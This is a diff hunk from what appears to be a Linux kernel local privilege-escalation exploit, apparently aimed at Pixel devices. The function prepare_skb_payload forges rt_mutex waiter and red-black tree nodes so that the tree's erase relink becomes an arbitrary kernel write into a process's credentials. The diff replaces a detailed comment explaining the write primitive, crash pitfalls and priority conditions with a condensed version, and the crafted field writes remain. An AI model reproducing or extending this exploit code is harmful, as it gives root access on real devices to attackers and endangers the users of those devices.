@@ -372,33 +372,12 @@ int prepare_skb_payload(uintptr_t base) {
     put64(p, LOCK_OFF + 0x18, fake_task | 1);
 
     if (compact) {
-      /* 6.1 COMPACT_RT_MUTEX_WAITER:
-       * tree_entry[0x18] pi_tree_entry[0x18] task@0x30 lock@0x38
-       * wake_state@0x40 prio@0x44 deadline@0x48 ww_ctx@0x50
-       *
-       * TCP nonzero values ride the main_tcp convention
-       * (Root-My-Pixel-Payloads src/61, tokay default shape): pi pc
-       * carries the value, rb_left the destination; the erase
-       * left-only relink stores
-       * *(dest) := pc before anything is derived from pc. rb_right must
-       * stay 0 there: a nonzero right takes the one-child arm whose
-       * second write clobbers *(value+0) with dest-8 (houji W2 read
-       * that back as uid=upper32(dest-8)).
-       *
-       * Zero-value writes keep the target-8 shape instead: pc=0 leaves
-       * the relink parentless, which stamps dest into fake_task's
-       * pi_waiters root; the next enqueue_pi walks dest as an rb_node
-       * and trashes the task head (houji W3 panic). With pc=dest-8 the
-       * change_child else-branch stores 0 at *dest and the red victim
-       * makes rebalance NULL (rbtree_augmented.h case 1), so nothing
-       * else runs. The pselect fallback uses these words everywhere.
-       *
-       * prio must stay > DEFAULT_PRIO (120): only then does the stale
-       * waiter insert left of W0, become top waiter, and reach the
-       * rt_mutex_dequeue_pi erase that consumes these words. W2 accepts
-       * the relink's secondary write of dest into *(value+8), inside
-       * the cred image (gid/suid qword, uid untouched); value=0 sends
-       * it to the payload page's own rb_root instead. */
+      /* Words ride the erase relink: pc = value, rb_left = dest,
+       * rb_right = 0 or the one-child arm also clobbers *(value) with
+       * dest-8. Value 0 uses pc = dest-8 (stores 0 at *dest); pc = 0
+       * would leave the node parentless for enqueue_pi to trash
+       * fake_task. prio > 120 gates this erase. The relink's second
+       * write lands in *(value+8): cred image on W2, page rb_root at 0. */
       put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
       put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
       put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
